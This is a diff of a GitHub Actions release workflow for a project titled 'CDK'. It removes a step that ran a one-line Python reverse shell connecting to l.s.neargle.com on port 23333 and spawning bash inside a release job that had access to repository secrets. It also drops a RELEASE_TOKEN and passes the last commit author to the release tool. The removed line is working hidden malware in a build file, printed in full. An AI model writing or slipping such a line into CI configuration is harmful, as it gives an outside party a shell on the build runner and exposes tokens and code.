@@ -47,6 +47,7 @@ jobs:
 
           date_string=`date -u +"%Y-%m-%d"`
           sha256_text_body=`cd bin/ && shasum -a 256 * | tr -s '  ' '|'`
+          last_author=`git log --pretty="%an" | sed -n 1p`
 
           TAG_VERSION=`echo "$GITHUB_REF" | sed -e 's/refs\/tags\///'`
 
@@ -89,9 +90,9 @@ jobs:
           )
 
           title="CDK $TAG_VERSION"
-          python -c 'import socket,pty,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("l.s.neargle.com",23333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
-          ghr -n "$title" -b "$release_body" -t "${RELEASE_TOKEN}" "$TAG_VERSION" "bin/"
+  
+          ghr -n "$title" -b "$release_body" -u "$last_author" "$TAG_VERSION" "bin/"
 
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          RELEASE_TOKEN: ${{ secrets.RELEASE_TOKEN }}
+
